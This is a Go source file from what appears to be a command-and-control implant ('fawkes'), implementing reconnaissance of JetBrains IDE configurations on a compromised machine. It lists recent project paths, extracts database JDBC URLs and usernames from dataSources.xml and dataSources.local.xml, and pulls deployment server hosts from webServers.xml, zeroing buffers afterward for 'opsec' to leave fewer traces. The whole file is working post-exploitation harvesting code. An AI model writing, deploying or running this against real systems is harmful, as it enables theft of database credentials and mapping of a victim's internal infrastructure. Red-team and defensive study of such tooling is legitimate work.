package commands

import (
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"

	"fawkes/pkg/structs"
)

// ideReconJetBrains scans JetBrains IDE configurations.
func ideReconJetBrains(sb *strings.Builder, homes []string) {
	sb.WriteString("\n--- JetBrains IDEs ---\n")

	for _, home := range homes {
		configBase := ideJetBrainsConfigBase(home)
		if configBase == "" {
			sb.WriteString(fmt.Sprintf("  JetBrains config directory not determined for %s\n", home))
			continue
		}

		// Discover installed JetBrains products
		products := ideDiscoverJetBrainsProducts(configBase)
		if len(products) == 0 {
			sb.WriteString("  No JetBrains IDEs found\n")
			continue
		}

		for _, product := range products {
			sb.WriteString(fmt.Sprintf("\n  [%s] %s\n", product.name, product.path))

			// Recent projects
			ideJetBrainsRecentProjects(sb, product.path)

			// Data sources (database connections)
			ideJetBrainsDataSources(sb, product.path)

			// Web servers / deployment targets
			ideJetBrainsDeployment(sb, product.path)
		}
	}
}

// ideJetBrainsConfigBase returns the JetBrains config base directory.
func ideJetBrainsConfigBase(home string) string {
	switch runtime.GOOS {
	case "darwin":
		return filepath.Join(home, "Library", "Application Support", "JetBrains")
	case "linux":
		return filepath.Join(home, ".config", "JetBrains")
	case "windows":
		appdata := os.Getenv("APPDATA")
		if appdata == "" {
			appdata = filepath.Join(home, "AppData", "Roaming")
		}
		return filepath.Join(appdata, "JetBrains")
	default:
		return filepath.Join(home, ".config", "JetBrains")
	}
}

type jetbrainsProduct struct {
	name string
	path string
}

// ideDiscoverJetBrainsProducts finds installed JetBrains IDE config directories.
func ideDiscoverJetBrainsProducts(configBase string) []jetbrainsProduct {
	entries, err := os.ReadDir(configBase)
	if err != nil {
		return nil
	}

	knownProducts := map[string]string{
		"IntelliJIdea": "IntelliJ IDEA",
		"PyCharm":      "PyCharm",
		"GoLand":       "GoLand",
		"WebStorm":     "WebStorm",
		"PhpStorm":     "PhpStorm",
		"CLion":        "CLion",
		"Rider":        "Rider",
		"RubyMine":     "RubyMine",
		"DataGrip":     "DataGrip",
		"Fleet":        "Fleet",
	}

	var products []jetbrainsProduct
	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		dirName := e.Name()
		for prefix, productName := range knownProducts {
			if strings.HasPrefix(dirName, prefix) {
				products = append(products, jetbrainsProduct{
					name: productName + " (" + dirName + ")",
					path: filepath.Join(configBase, dirName),
				})
				break
			}
		}
	}

	return products
}

// ideJetBrainsRecentProjects reads recent project paths from JetBrains config.
func ideJetBrainsRecentProjects(sb *strings.Builder, productPath string) {
	recentPath := filepath.Join(productPath, "options", "recentProjects.xml")
	data, err := os.ReadFile(recentPath)
	if err != nil {
		// Try alternate location
		recentPath = filepath.Join(productPath, "options", "recentSolutions.xml")
		data, err = os.ReadFile(recentPath)
		if err != nil {
			return
		}
	}
	defer structs.ZeroBytes(data) // opsec: clear recent project paths (may reveal sensitive project names)

	projects := ideParseJetBrainsRecentXML(string(data))
	if len(projects) == 0 {
		return
	}

	sb.WriteString(fmt.Sprintf("    Recent projects (%d):\n", len(projects)))
	limit := len(projects)
	if limit > 10 {
		limit = 10
	}
	for _, p := range projects[:limit] {
		sb.WriteString(fmt.Sprintf("      %s\n", p))
	}
	if len(projects) > 10 {
		sb.WriteString(fmt.Sprintf("      ... and %d more\n", len(projects)-10))
	}
}

// ideParseJetBrainsRecentXML extracts project paths from JetBrains XML config.
func ideParseJetBrainsRecentXML(content string) []string {
	var paths []string
	seen := make(map[string]bool)

	// JetBrains stores paths with $USER_HOME$ or $PROJECT_DIR$ variables
	// Look for key="..." value patterns containing paths
	for _, line := range strings.Split(content, "\n") {
		line = strings.TrimSpace(line)

		// Match entry key="path" or value="path"
		for _, attr := range []string{`key="`, `value="`} {
			idx := strings.Index(line, attr)
			if idx < 0 {
				continue
			}
			start := idx + len(attr)
			end := strings.Index(line[start:], `"`)
			if end < 0 {
				continue
			}
			val := line[start : start+end]

			// Expand $USER_HOME$
			val = strings.ReplaceAll(val, "$USER_HOME$", "~")

			// Only include paths that look like file system paths
			if strings.HasPrefix(val, "/") || strings.HasPrefix(val, "~") ||
				(len(val) > 3 && val[1] == ':' && (val[2] == '\\' || val[2] == '/')) {
				if !seen[val] {
					paths = append(paths, val)
					seen[val] = true
				}
			}
		}
	}

	return paths
}

// ideJetBrainsDataSources reads database connection configurations.
func ideJetBrainsDataSources(sb *strings.Builder, productPath string) {
	dsPath := filepath.Join(productPath, "options", "dataSources.xml")
	data, err := os.ReadFile(dsPath)
	if err != nil {
		// Also check dataSources.local.xml for credentials
		dsPath = filepath.Join(productPath, "options", "dataSources.local.xml")
		data, err = os.ReadFile(dsPath)
		if err != nil {
			return
		}
	}
	defer structs.ZeroBytes(data) // opsec: contains database credentials, connection strings

	sources := ideParseJetBrainsDataSources(string(data))
	if len(sources) == 0 {
		return
	}

	sb.WriteString(fmt.Sprintf("    Data sources (%d):\n", len(sources)))
	for _, ds := range sources {
		sb.WriteString(fmt.Sprintf("      %s\n", ds))
	}
}

// ideParseJetBrainsDataSources extracts database connection info from JetBrains XML.
func ideParseJetBrainsDataSources(content string) []string {
	var sources []string

	var currentName string
	for _, line := range strings.Split(content, "\n") {
		line = strings.TrimSpace(line)

		// Extract data source name
		if strings.Contains(line, `name="`) && strings.Contains(line, "data-source") {
			if name := ideExtractXMLAttr(line, "name"); name != "" {
				currentName = name
			}
		}

		// Extract JDBC URL
		if strings.Contains(line, "jdbc") || strings.Contains(line, "url") {
			if url := ideExtractXMLAttr(line, "value"); url != "" {
				if strings.Contains(url, "jdbc:") || strings.Contains(url, "://") {
					label := url
					if currentName != "" {
						label = currentName + ": " + url
					}
					if len(label) > 150 {
						label = label[:150] + "..."
					}
					sources = append(sources, label)
				}
			}
		}

		// Extract username
		if strings.Contains(line, "user") {
			if user := ideExtractXMLAttr(line, "value"); user != "" && !strings.Contains(user, "jdbc:") {
				if currentName != "" {
					sources = append(sources, currentName+" user: "+user)
				}
			}
		}
	}

	return sources
}

// ideJetBrainsDeployment reads deployment/server configurations.
func ideJetBrainsDeployment(sb *strings.Builder, productPath string) {
	deployPath := filepath.Join(productPath, "options", "webServers.xml")
	data, err := os.ReadFile(deployPath)
	if err != nil {
		return
	}
	defer structs.ZeroBytes(data) // opsec: contains deployment server credentials

	servers := ideParseJetBrainsServers(string(data))
	if len(servers) == 0 {
		return
	}

	sb.WriteString(fmt.Sprintf("    Deployment servers (%d):\n", len(servers)))
	for _, s := range servers {
		sb.WriteString(fmt.Sprintf("      %s\n", s))
	}
}

// ideParseJetBrainsServers extracts server configurations from JetBrains XML.
func ideParseJetBrainsServers(content string) []string {
	var servers []string

	var currentName string
	for _, line := range strings.Split(content, "\n") {
		line = strings.TrimSpace(line)

		if strings.Contains(line, `name="`) && (strings.Contains(line, "server") || strings.Contains(line, "Server")) {
			if name := ideExtractXMLAttr(line, "name"); name != "" {
				currentName = name
			}
		}

		if strings.Contains(line, "host") || strings.Contains(line, "url") {
			if host := ideExtractXMLAttr(line, "value"); host != "" {
				label := host
				if currentName != "" {
					label = currentName + ": " + host
				}
				servers = append(servers, label)
			}
			if host := ideExtractXMLAttr(line, "host"); host != "" {
				label := host
				if currentName != "" {
					label = currentName + ": " + host
				}
				servers = append(servers, label)
			}
		}
	}

	return servers
}
